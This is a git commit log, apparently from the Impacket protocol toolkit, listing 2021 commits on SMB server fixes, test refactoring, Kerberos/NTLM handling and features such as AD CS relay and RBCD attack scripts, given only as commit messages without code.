Author: Podalirius <79218792+p0dalirius@users.noreply.github.com>
Date:   Fri Oct 1 10:36:13 2021 +0200

    Update secretsdump.py

commit f53eb5fc913899821c45cd951b3c8f8d9c309c55
Author: Podalirius <79218792+p0dalirius@users.noreply.github.com>
Date:   Fri Oct 1 10:35:07 2021 +0200

    Update secretsdump.py

commit 8cd1943f6e79f008c4e08b2ca705eff1e3177b8b
Author: Sam Free5ide <snovvcrash@protonmail.ch>
Date:   Thu Sep 30 01:06:31 2021 +0300

    Update debug message

commit f2eb3796a3631184efeeb1ab46bee8c2f151cde2
Author: Shutdown <nwodtuhs+github@pm.me>
Date:   Wed Sep 29 11:09:44 2021 +0200

    Small edits to allow RBCD attack from user account

commit 7298b27fd3d0016788e4c1691ce6c75568031eba
Author: Sam Free5ide <snovvcrash@protonmail.ch>
Date:   Tue Sep 28 22:45:30 2021 +0300

    Update debug message

commit 14e2ef47cff6b07239a19e7e3e91405b6ec8fa02
Author: Sam Free5ide <snovvcrash@protonmail.ch>
Date:   Tue Sep 28 22:42:04 2021 +0300

    Process target domain and alt domain separately

commit ff7c521aa65c8459789585ccb5734c6e1d65f0fb
Merge: 2f18e484 19ce514e
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Tue Sep 28 15:26:30 2021 -0300

    Merge pull request #1169 from rmaksimov/fix-typos
    
    fix typos

commit 2f18e484a6e7e4f9fce3d62dac4fe621486067ab
Merge: 5a7a7ada 4c0534b1
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Tue Sep 28 15:24:00 2021 -0300

    Merge pull request #1170 from rmaksimov/fix-ldap-misc
    
    fix displaying destination port number in ldap.py

commit 5a7a7ada6a6192560052f7089b1cffaa1fe16e92
Merge: d2e939d1 5c25bab4
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Tue Sep 28 15:21:07 2021 -0300

    Merge pull request #1168 from rmaksimov/refactor-crypto
    
    fix typos and remove unnecessary condition

commit 70d77f6669d5bea7f422d552658ccbdcd68c65d4
Author: Sam Free5ide <snovvcrash@protonmail.ch>
Date:   Tue Sep 28 21:18:46 2021 +0300

    Edit option name

commit 4c0534b10151c008afcafb998ee583d261b95c35
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Sun Jan 31 03:32:15 2021 +0300

    fix displaying destination port number

commit 19ce514e0391912054007d2fc37c98776cfbbe17
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Mon Sep 6 12:33:11 2021 +0300

    fix typos

commit 84a73dc038f098b8fff2ebb5f8309e9399561272
Author: Sam Free5ide <snovvcrash@protonmail.ch>
Date:   Mon Sep 27 23:38:48 2021 +0300

    Remove f-strings for Python 2 support

commit d2e939d192075403176cffc5f2c88b222713f69d
Merge: c7bc76f8 9725f5b4
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Mon Sep 27 16:22:08 2021 -0300

    Merge pull request #1119 from snovvcrash/smbpasswd
    
    Change user password providing NTLM hashes instead of a plaintext value

commit 9725f5b4b70927e4e86bf6a3dd4a447f155ffe70
Merge: 65663921 c7bc76f8
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Mon Sep 27 16:13:08 2021 -0300

    Merge branch 'master' into smbpasswd

commit a28a7f86ae6b14fec3da59ebe3e1a6b0b7236d2f
Author: Sam Free5ide <snovvcrash@protonmail.ch>
Date:   Sun Sep 26 22:40:57 2021 +0300

    Add alternative credentials options

commit 65663921b2926aeddcfe14ec69c917da36c93638
Author: Sam Free5ide <snovvcrash@protonmail.ch>
Date:   Sat Sep 25 15:47:52 2021 +0300

    Refactor target string parsing

commit dc2119ec3c1b78f5d65a18ed7159f934b9faba11
Author: snovvcrash <snovvcrash@protonmail.ch>
Date:   Sat Sep 25 15:35:53 2021 +0300

    Update header format
    
    Co-authored-by: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>

commit 71b5da37ac246c2b53a2eef1e17c1c39d5bcb2eb
Author: snovvcrash <snovvcrash@protonmail.ch>
Date:   Sat Sep 25 15:35:44 2021 +0300

    Update header format
    
    Co-authored-by: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>

commit a3bc8422dea16f5cd8be3e62627916d070c71422
Author: snovvcrash <snovvcrash@protonmail.ch>
Date:   Sat Sep 25 15:35:32 2021 +0300

    Update header format
    
    Co-authored-by: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>

commit a3eaab5723c110a9f10de5b03992339593490ff5
Author: snovvcrash <snovvcrash@protonmail.ch>
Date:   Sat Sep 25 15:35:18 2021 +0300

    Update header format
    
    Co-authored-by: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>

commit cb84aaa28ec67bbd25403195c2de85f0a4db69dd
Author: Gifts <GiftsUngiv3n@gmail.com>
Date:   Wed Sep 22 21:12:47 2021 +0300

    Implementing reg.py DELETE functionality.

commit c7bc76f8a726f04af9108d24b50f789e13f4688f
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Wed Sep 22 10:20:44 2021 -0300

    Changelog (#1159)
    
    * Using markdown and added all previous available releases in ChangeLog file.

commit c588e99e9c99d14fdfb9b365436a22371d8fc06f
Author: Gifts <GiftsUngiv3n@gmail.com>
Date:   Wed Sep 22 15:46:33 2021 +0300

    Implementing reg.py ADD functionality in order to be able to modify remote registry.
    Currently, modification of (Default) key is not implemented.

commit f057477633fa9caa269eb3ec1c41e2e20abadea1
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Tue Sep 21 15:11:27 2021 -0300

    Removed some deprecation warnings (#1157)
    
    * Fixed warnings related to threading, that will start to appear in Pyhton 3.10, see https://docs.python.org/3.10/whatsnew/3.10.html#deprecated
    * Fixed warnings related to unrecognized escape sequences, see https://docs.python.org/3/reference/lexical_analysis.html#string-and-bytes-literals

commit 0297480bf2a4abfeb2ad63e15efb113f94a346e7
Merge: 5b4009ab b4957ae1
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Fri Sep 17 16:17:43 2021 -0300

    Merge pull request #1133 from ShutdownRepo/kdctime
    
    Return server time in case of clock skew with KDC

commit 5b4009aba604d93cd397580e92165e0184e74e75
Merge: 50c76958 ee86a6d6
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Fri Sep 17 15:22:56 2021 -0300

    Merge pull request #1153 from exploide/getST-typo
    
    getST.py: fixed wrong example in usage output

commit ee86a6d606ac07906bc05a33ab75058e10bb8fef
Author: exploide <me@exploide.net>
Date:   Mon Sep 13 12:20:23 2021 +0200

    getST.py: fixed wrong example in usage output

commit 50c76958706577a5005bec2ee1fda9e9fa669a65
Merge: 5aa97fa7 db758f1b
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Mon Sep 6 17:58:40 2021 -0300

    Merge pull request #1146 from LZD-TMoreggia/master
    
    Support HTTP WWW-Authenticate: Negotiate

commit db758f1b6acaebd37f55991abd2f8bdcb988b74b
Author: LZD-TMoreggia <79073462+LZD-TMoreggia@users.noreply.github.com>
Date:   Mon Sep 6 17:48:49 2021 +0800

    Update httprelayclient.py
    
    Always return a value from sendNegotiate.

commit 5c25bab4fd71f300c374fdf7aa4670be2bcfb85f
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Sun Jan 31 03:18:26 2021 +0300

    fix typos

commit 29bf6d2cdb8c97037ab2b6fa9785f8188f11b0f4
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Sun Jan 31 03:17:30 2021 +0300

    remove unnecessary check

commit 83fcc47e6a159bc439980c9874dc716f93a1280c
Merge: 1eb4ef30 1893ce7f
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Sep 3 13:15:27 2021 -0700

    Merge branch 'test-refactor' into test-refactor-py310

commit 1893ce7f96d5b616303473e21fdbea946fb55899
Merge: fac17201 c348d94b
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Sep 3 11:19:27 2021 -0700

    Merge branch 'test-refactor' of https://github.com/SecureAuthCorp/impacket into test-refactor

commit fac172018fddd066955154156cd6378c4348f8d3
Merge: c39fc6e4 5aa97fa7
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Sep 3 11:17:17 2021 -0700

    Merge branch 'master' into test-refactor

commit c348d94b0f275db449906fad27ab9434c8c3ff90
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Sep 3 15:15:31 2021 -0300

    Tests: Refactor DCE/RPC endpoints test cases (#1151)
    
    Main changes are:
    * Moved DCE/RPC endpoints test cases to a separate folder to better match code layout
    * Using a base class for test cases to abstract code and reduce reuse
    * Improved some of the tests cases to avoid code duplication
    * Marking and skipping tests cases known to be failing

commit 5aa97fa704ab88646f0bd9b814bedb2ba6368892
Merge: 29f7217e def1f7c7
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Aug 27 16:29:57 2021 -0300

    Merge pull request #1147 from SecureAuthCorp/smbserver-fixes
    
    SMBServer: Big review, fixes and improvements

commit 29f7217e39c07820000f5378cdb192fb2fbbac89
Merge: 358fc7c6 4419d125
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Fri Aug 27 10:17:29 2021 -0300

    Merge pull request #1136 from mohemiv/http-fix
    
    Complying MS-RPCH with HTTP/1.1

commit def1f7c78eb4f5d2d0accb6953b1f0e4340c6119
Merge: 863b3c8d 1636eaab
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Thu Aug 26 10:32:29 2021 -0700

    Merge branch 'master' into smbserver-fixes

commit d593450fcc0e6c9627d494729551c1270ef540ee
Author: LZD-TMoreggia <79073462+LZD-TMoreggia@users.noreply.github.com>
Date:   Thu Aug 26 13:15:54 2021 +0800

    Use NTLM if available

commit 56acc51fec71cc7d951a0f05571db5ba49409409
Author: LZD-TMoreggia <79073462+LZD-TMoreggia@users.noreply.github.com>
Date:   Thu Aug 26 13:03:54 2021 +0800

    Remove stuff not yet in master

commit 7f939e8f865bdd5ac5cf578d276bf0536fffbce3
Author: LZD-TMoreggia <79073462+LZD-TMoreggia@users.noreply.github.com>
Date:   Thu Aug 26 13:01:15 2021 +0800

    Do NTLM auth when server advertise Negotiate
    
    WWW-Authenticate: Negotiate should accept NTLM auth, only the headers change. Tested on ADCS only.

commit 863b3c8de0255b0fc33ec213f26f11bf9c664438
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Wed Aug 11 15:08:09 2021 -0700

    SMBServer: Adding missing info level and fixed structure
    
    This adds a missing Reserved field specified in [MS-FSCC] 2.4.19 and handles some SMB2 info levels that were missing as well. Should help fixing #1093.

commit 730a2c4976bc538473ca563436a0cb45ac1b6cc1
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Aug 11 16:58:47 2021 -0300

    SMBServer: Improved file and path name handling in queryFileInformation & queryPathInformation.

commit b43001875e283d679dfa31cc3cc70ca7d3cd1392
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Wed Aug 11 11:24:46 2021 -0700

    SMBServer: Fixed directory file attribute on SMB2_FILE_ALL_INFO

commit 51cd77bd0cc6fd66564a337647c03deec6e548da
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Mon Aug 9 20:54:18 2021 -0300

    SMBServer: Enabled SMB_COM_FLUSH method
    
    * It should fix #714

commit ee3b178d91f51c52ed60a186acf00afe17e72f2f
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Mon Aug 9 20:49:33 2021 -0300

    SMBServer: Added SMB2 support to QUERY_INFO Request (SMB2_0_INFO_FILE)
    
    * It should fix #1094

commit 7cd166bfab58f220e122487b356122ffc8c27271
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Mon Aug 2 10:19:13 2021 -0700

    SMB Client: Handling empty search count in FindFileBothDirectoryInfo
    
    Better handle the case when SMB_FIND_FILE_BOTH_DIRECTORY_INFO returns and empty list of items.

commit 0bf5f0515bbab40c65de7b53ab41a2e4d58b24dc
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Jul 30 14:53:18 2021 -0700

    SMBServer: Added missing query information levels
    
    * Added missing const and structure for the QUERY_FS Information Level SMB_QUERY_FS_DEVICE_INFO. This is part of #1093.
    * Handling missing SMB2 query info level SMB2_FILE_STANDARD_INFO

commit 7bf33024bbbe2466501f8d226225b968aab5be43
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Thu Jul 29 08:08:09 2021 -0700

    SMBServer: Various fixes and improvements
    
    * Harness unit and functional tests, covering more operations
    * Added test for unicode filenames #878
    * Added test for unicode username #700
    * Added TID checks
    * Hardened path checks:
      * Added a normalize_path function
      * Using isInFileJail across operations
    * Added close method to avoid address reuse in tests

commit 1eb4ef30b223655e8d21ecdbefe5c113d6eca312
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Tue Aug 17 13:22:48 2021 -0700

    Tests: Remove pytest freeze version

commit c3c4fe6faa5271b40555e5eadbb09eda0e7b8bec
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Tue Aug 17 12:59:40 2021 -0700

    Tests: Added Python 3.10 rc to GH Actions workflow

commit 5fd22878b4d57a5a5e0a22ed1faa1b8afe9acd9b
Merge: da1d5640 358fc7c6
Author: ExAndroidDev <exandroiddev@protonmail.com>
Date:   Sun Aug 15 20:08:03 2021 +0200

    Merge branch 'master' into ntlmrelayx-adcs-attack

commit da1d5640fecd0d8f70b1f3ba5f345f3dd7845944
Merge: 5f1ced6d ed9fd5aa
Author: ExAndroidDev <80745365+ExAndroidDev@users.noreply.github.com>
Date:   Sun Aug 15 19:41:54 2021 +0200

    Merge pull request #1 from Tw1sm/ntlmrelayx-adcs-attack
    
    Fix when cert server does not request NTLM auth

commit 358fc7c6be8488f24fa900220b4f2a82901b5774
Merge: 1636eaab c9e81999
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Sat Aug 14 00:56:40 2021 -0300

    Merge pull request #1141 from skelsec/master
    
    major speedup for ntds parsing

commit c9e8199909e51b0a6c358cf2a1e113b5a7c7ba47
Author: skelsec <info@skelsec.com>
Date:   Wed Aug 11 12:48:58 2021 +0200

    adding peklist to global filter

commit b73c54b39e6861947f81ecb59bf2b75f9e9cf12d
Author: skelsec <info@skelsec.com>
Date:   Wed Aug 11 00:25:07 2021 +0200

    2x speedup for ntds.dit parsing

commit ed9fd5aade3b3d1e60c009cd9765cf15d019ea66
Author: Tw1sm <mcreel31@gmail.com>
Date:   Wed Aug 4 10:08:55 2021 -0400

    prevent replay of already attacked clients

commit 2b7493809fc4ab235080e6d72b21259080e6ed4b
Author: tw1sm <mcreel31@gmail.com>
Date:   Wed Aug 4 00:20:08 2021 -0400

    Send auth even if not requested by cert server

commit 4419d1255108f8e7acb6ce5d17a7a13857d83703
Author: Arseniy Sharoglazov <mohemiv@users.noreply.github.com>
Date:   Mon Aug 2 21:29:37 2021 +0300

    Complying MS-RPCH with HTTP/1.1

commit b4957ae1ff2cc1cfe091d9ab4a677dd0f3f380c9
Author: Shutdown <nwodtuhs+github@pm.me>
Date:   Mon Aug 2 13:26:47 2021 +0200

    Moving code out of direct if loop
    Co-authored-by: pixis <hackndo@gmail.com>

commit 9d2655f994aa55a51cdbacb263ab4a444125fa63
Author: Shutdown <40902872+ShutdownRepo@users.noreply.github.com>
Date:   Fri Jul 30 19:46:16 2021 +0200

    Trying to add hackndo to the authors
    
    Co-authored-by: pixis <hackndo@gmail.com>

commit 1a67bfafdb177c1bcddb9651bea8b88b95cd7c33
Author: Shutdown <nwodtuhs+github@pm.me>
Date:   Fri Jul 30 19:25:46 2021 +0200

    Returns server time in case of KRB_AP_ERR_SKEW

commit 8f67e44bfa707e5b90318dc1a23bf12cc3390e35
Author: Sam Free5ide <snovvcrash@protonmail.ch>
Date:   Fri Jul 30 16:42:41 2021 +0300

    Add more 'password expired' exception checks

commit c39fc6e48c26afef32889616d8b7ffb0cdea5481
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Thu Jul 29 12:37:30 2021 -0300

    Tests: Simplify remote configuration (#1131)
    
    * Merged TCP and SMB transport configuration into only one.
    * Abstracted remote configuration parsing routines into functions.
    * Remote config file can now be specified as pytest option.
    * Added some notes on testing guide.

commit 5f1ced6d91c4123e30155facbfdab82b0cd46ad0
Merge: 2ace5639 1636eaab
Author: ExAndroidDev <exandroiddev@protonmail.com>
Date:   Tue Jul 27 16:38:08 2021 +0200

    Merge branch 'master' into ntlmrelayx-adcs-attack

commit 1636eaab69eb3b62399db76d12f552ecebb710d0
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Mon Jul 26 18:01:01 2021 -0300

    dpapi.py: Updated description and copyright year.

commit 8f2cdef322516dec196c5defa5a68bd4d4d4f4a1
Merge: cd4fe47c 06af814e
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Mon Jul 26 17:40:39 2021 -0300

    Merge pull request #1073 from w0rmh013/master
    
    Fixed wrong Enum type when dumping credential blob

commit eb884d8e3dd20a1d6daa56ac1abfced41ecc4a46
Merge: 2d323838 0b4a759f
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Jul 23 11:15:57 2021 -0300

    Merge pull request #1125 from SecureAuthCorp/test-refactor-assert
    
    Tests: Refactors to some tests

commit 0b4a759fb8ca414da2270b1af668d4ba8b5254b8
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Wed Jul 21 14:24:17 2021 -0700

    Tests: Refactors to some tests
    
    * Moved binary hashes to base class
    * Using assertEqual instead of assertTrue when possible
    * Fixed a couple of bad assertions

commit 51b66c71b3ea8538176dcffac665bbbfef5ebfb5
Merge: 2d323838 cd4fe47c
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Tue Jul 20 06:57:48 2021 -0700

    Merge branch 'master' into test-refactor-catchup

commit cd4fe47cfcb72d7d35237a99e3df95cedf96e94f
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Wed Jul 7 12:27:31 2021 -0700

    Arrange tagline, copyright and license notes across all source files
    
    This was a pending change to:
    - Use the same tagline, copyright and license notice across files.
    - Remove authors' contacts that are no longer valid (due to affiliation changes).
    - Update repository location.
    - Update license file with missing licenses (althought those were already in source files).
    
    This doesn't include any change on the source code, nor any change on current copyright or licenses. Just formatting and phrasing to make our and distro's maintainers life easier.

commit 2d3238381179d426ed3b33139d39f445f71af113
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Jul 16 10:44:12 2021 -0300

    Tests: Refactored configuration of remote test cases (#1122)
    
    Refactored configuration to avoid duplicated code.
    
    Main changes are:
    * Moved AES keys config to base class
    * Moved hash split to base class
    * Made machine hashes parameters optional
    * Made AES keys parameters optional
    * Updated testing guide

commit e4483d46254c33ff0d25f6a5667d5a0964ecc191
Author: Sam Free5ide <snovvcrash@protonmail.ch>
Date:   Fri Jul 9 21:00:54 2021 +0300

    Fix options parsing for a local account

commit 8a344ff2cd5bfc89b34110c3a5cd0ddcdffb1878
Author: Sam Free5ide <snovvcrash@protonmail.ch>
Date:   Fri Jul 9 16:11:58 2021 +0300

    Allow to use NTLM hashes as a new password value

commit 6cfe404f816a7651b766c9176046e461d477dcfc
Merge: 6bb5ea42 b3a608eb
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Thu Jul 8 12:15:14 2021 -0300

    Merge pull request #1118 from SecureAuthCorp/test-refactor-warnings
    
    Tests: Removed test files PEP8 warnings

commit b3a608eb35e26f9fbb0cb31908790a82641c756b
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Wed Jul 7 18:26:09 2021 -0700

    Tests: Removed test files PEP8 warnings

commit d479c1c9da1900fac6c9feaae09cd14db0cf599d
Merge: 6bb5ea42 6da655ca
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Wed Jul 7 16:42:29 2021 -0700

    Merge branch 'master' into test-refactor-catchup

commit 6da655ca9ac4f9c2a207ea47e79d089044accd78
Merge: 4821d64e 29ad5792
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Tue Jul 6 14:02:17 2021 -0300

    Merge pull request #1114 from cube0x0/master
    
    Added [MS-PAR]: Print System Asynchronous Remote Protocol

commit 29ad57929b9a798b80b8f51bcd155fe99f18ac7f
Author: cube0x0 <39370848+cube0x0@users.noreply.github.com>
Date:   Sun Jul 4 16:20:46 2021 +0200

    MS-PAR initial

commit 4821d64e3a078a79e60c0b03f08d0984d9a17728
Merge: 0efdf7c0 73b9466c
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Fri Jul 2 18:30:28 2021 -0300

    Merge pull request #1109 from cube0x0/master
    
    Added everything need for calling RpcAddPrinterDriverEx

commit 0efdf7c03737152f80c85f3b990df548c651baee
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Fri Jul 2 18:26:37 2021 -0300

    smbserver.py: Added NULL SMBv2 client connection handling
    
    It fixes #1048

commit 3c943ca5ae342e1288245fd1c79430cdff61602c
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Fri Jul 2 18:23:33 2021 -0300

    Define flag NTLMSSP_NEGOTIATE_ANONYMOUS

commit 6bb5ea427b8b11bd8d93355939654a293575a470
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Jul 2 12:22:14 2021 -0300

    Tests: Continue refactor of test cases (#1112)
    
    Continue refactor some of our test cases structure.
    
    Main changes introduced are:
    * Moved testing guide as a separate file and added some of the steps to configure the test environment.
    * Leveraging unittest.main to catch command-line args and build the default suite.
    * Only running GitHub actions workflow once for our own branches/PRs.
    * Remote test config file can be specified via an env var now.
    * Moved remote test config to a template and ignored config file.

commit 73b9466c17761384ece11e1028ec6689abad6818
Author: cube0x0 <39370848+cube0x0@users.noreply.github.com>
Date:   Wed Jun 30 10:05:36 2021 -0400

    added RpcEnumPrinterDrivers

commit f43cf082c825676e22657ab534a53e4da2f3ca50
Author: cube0x0 <39370848+cube0x0@users.noreply.github.com>
Date:   Tue Jun 29 12:53:15 2021 -0400

    Add files via upload

commit b08473b7a2dc9d48ca7d7e931ceaf1fa548cdc47
Author: Shutdown <nwodtuhs+github@pm.me>
Date:   Tue Jun 29 17:54:21 2021 +0200

    Added rbcd attack script

commit 142cacb649b8c6441df9330ac22fe4d15a0d1bbc
Merge: 94881a6b f1896d22
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Tue Jun 29 12:35:13 2021 -0300

    Merge pull request #1074 from franferrax/master
    
    WMI objects minor refactors, fixes, and offline parsing tests

commit de0bfa4352a448cec1ff494186c54b353d33c640
Author: Brandon Forbes <reznok@gmail.com>
Date:   Mon Jun 28 20:00:52 2021 -0700

    Update KeyBlock name

commit b8c8f9cc3e9f211dd31d6851f0c30faf7cb3f537
Author: Brandon Forbes <reznok@gmail.com>
Date:   Mon Jun 28 19:58:40 2021 -0700

    Add support for V3 ccache

commit 94881a6b626f5e3801033a57a6c5a85a6ade768a
Merge: 2eff99fc 442fac97
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Mon Jun 28 15:42:37 2021 -0300

    Merge pull request #1095 from deadjakk/master
    
    Added 'mget' to smbclient.py

commit 9170de2d3d9f966871136f54d22cea2f79fdca10
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Mon Jun 28 15:26:42 2021 -0300

    Tests: Moving flake8 steps to a separate job so we fail early and don't repeat (#1105)

commit 442fac9765d5da85f706e4cfc8eef5246a2c0475
Author: deadjakk <deadjakk@shell.rip>
Date:   Sat Jun 26 12:22:59 2021 -0500

    updated copyright year to 2021

commit 40f93aa8900b918f925993a14a066849bc8b219c
Author: deadjakk <30613497+deadjakk@users.noreply.github.com>
Date:   Sat Jun 26 12:23:16 2021 -0500

    Update impacket/examples/smbclient.py
    
    Omit directories from downloads
    
    Co-authored-by: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>

commit 2eff99fc737df3dfba5b3b14651c5560cc5fdf2c
Merge: 11f43043 b81e07eb
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Fri Jun 25 15:03:49 2021 -0300

    Merge pull request #1096 from SecureAuthCorp/pip-install
    
    Setup: Using proper pip calls

commit 658e0ab8e1d3b0b738439e67a7ad1c8f4b73f661
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Jun 25 11:19:52 2021 -0300

    Tests: First batch of changes on refactoring test cases (#1102)
    
    Tests: First batch of changes on refactoring test cases
    
    This is the first part of a larger effort to refactor some of our test cases structure.
    
    Main changes introduced are:
    - Using pytest as the testing framework to organize and mark test cases.
    - Replacing custom bash scripts with test cases discovery.
    - Integrating pytest-cov plugin to easier coverage collection and reporting.
    - Marking remote test cases to being able to pick those during run.
    - Abstracted remote test cases configuration in a base class.
    - Consolidating pytest, coverage and tox configuration in a single tox.ini file.
    - Removed some Python 2.5 support and replaced custom compat checks with six.
    - Replace unittest.TextTestRunner.run by unittest.main (cherry-picked from f5dab5ca76b60b9436f18d1ba5fd48abfa3626e1, thanks @franferrax !)

commit 2ace5639a1470341ba048f9376fd6303b49c5b51
Author: ExAndroidDev <exandroiddev@protonmail.com>
Date:   Wed Jun 23 19:13:37 2021 +0200

    Removed leftover print function

commit 81afc66904068e33c866bc9d005262c9ce69bad6
Author: ExAndroidDev <exandroiddev@protonmail.com>
Date:   Tue Jun 22 21:42:26 2021 +0200

    AD CS relay attack implementation

commit 11f430437d87f432fa404bffcf803b1e27ad0ca2
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Jun 18 05:48:10 2021 -0700

    Tests: PEP8 format on misc tests
    
    Made some PEP8 arrangements on misc unit tests modules

commit d659b7898b93040dd86f17032272f2b64f0c181e
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Jun 18 05:36:34 2021 -0700

    Tests: Adding coverage on passwords with @
    
    We were missing the case when passwords had one or more '@' characters.

commit b81e07eb578ad0cff2474f52b6a9a90209ccbb10
Merge: fd893934 1a5ed9dc
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Wed Jun 16 08:34:24 2021 -0700

    Merge branch 'master' into pip-install

commit 1a5ed9dc2160c154c851e85066dfb72882f5a473
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Jun 11 07:25:16 2021 -0700

    Clarified disclaimer and added security policy file.

commit fd893934e11304c9330ff74b14792e0e8e4f8009
Merge: 3fe60884 90ce4b7d
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Thu Jun 10 12:52:18 2021 -0700

    Merge branch 'master' into pip-install

commit 88a913d667f197888455d0429f087e05b2b454f3
Author: deadjakk <deadjakk@shell.rip>
Date:   Wed Jun 9 15:37:20 2021 -0500

    added error output  for empty mask

commit 9d3e92d25f2fe56ae825b16a83f164d0ba2f51bd
Author: deadjakk <deadjakk@shell.rip>
Date:   Wed Jun 9 15:22:09 2021 -0500

    added 'mget' to smbclient.py to allow for downloading of multiple files, much like the 'mget' command of smbclient(1)'

commit f1896d227994fa49fef9ecf45146fb8a929ed400
Author: Francisco Ferrari Bihurriet <francisco.ferrari@helpsystems.com>
Date:   Wed Jun 9 14:54:04 2021 -0300

    Fix WMI persist 'obscure' issue described in #1069 comment
    
    This partially restores the behavior prior to https://github.com/SecureAuthCorp/impacket/commit/fc466d16308797f7f59be92e294b02209156ceea#diff-626e3c8919e12e361f23696811214b85ba9fa2af78cce5c2f2b6a9d84a5d95e8L2416-R2431. Before these changes, we were the setting the inherited_default flag. After them, we were setting null_default instead. With this one, we are setting both.
    
    Further information and steps to reproduce in https://github.com/SecureAuthCorp/impacket/pull/1069#issuecomment-835179409. Additionally, a workaround is provided there, just in case this change isn't the preferred way to approach the issue.

commit f5749ec9da5ad9c34613c417f257e98b8c5ad768
Author: Francisco Ferrari Bihurriet <francisco.ferrari@helpsystems.com>
Date:   Wed Jun 9 14:16:40 2021 -0300

    Uniformize NullAndDefaultFlag names
    
    Rename default_value_is_null to null_default and default_value_is_inherited to inherited_default, so we don't use different names for the same thing. This aligns the names between d0d5ad5e940129847b9330773d722040ed6b1bb2 and b1499ae82242be2002dd2790ab5691c27c6c5962.
    
    Please note that these flags have no official name in https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmio/ed436785-40fc-425e-ad3d-f9200eb1a122.

commit e82af931328ddd0daa7998f0a3f4138d6f404c38
Author: Francisco Ferrari Bihurriet <francisco.ferrari@helpsystems.com>
Date:   Wed Jun 9 13:14:38 2021 -0300

    Limit previous fixes to number types
    
    New implemented tests have failed (see below), this change limits b1499ae82242be2002dd2790ab5691c27c6c5962 & bc57bf7404a5821efc82887d0bed083c52f9b4d0 fixes to number types (integers, booleans, floating point), which are read directly from the entry in ENCODED_VALUE.getValue(), without using the heap.
    
    I've also took advantage to make INSTANCE_TYPE.processNdTable() private.
    
    Failures:
    PY2: https://github.com/franferrax/impacket/runs/2785544033#step:7:254
    PY3: https://github.com/franferrax/impacket/runs/2785544159#step:7:272

commit a9e7b647b2d5322ad00a337574eb25663f6b5b9e
Author: Francisco Ferrari Bihurriet <francisco.ferrari@helpsystems.com>
Date:   Wed Jun 9 13:00:17 2021 -0300

    Revert #1069 fix
    
    As explained in f9514ee36d3f0d74235603d044db8774457ac882, #1069 fix is no longer needed after b1499ae82242be2002dd2790ab5691c27c6c5962 & bc57bf7404a5821efc82887d0bed083c52f9b4d0 changes

commit f9514ee36d3f0d74235603d044db8774457ac882
Author: Francisco Ferrari Bihurriet <francisco.ferrari@helpsystems.com>
Date:   Wed Jun 9 12:54:16 2021 -0300

    Create offline test parsing wmipersist.py objects
    
    Create self.createIWbemClassObject() helper to avoid duplicating logic. It also uses wmi.INTERFACE as a wmi.IWbemServices mock (this is enough for our testing purposes).
    
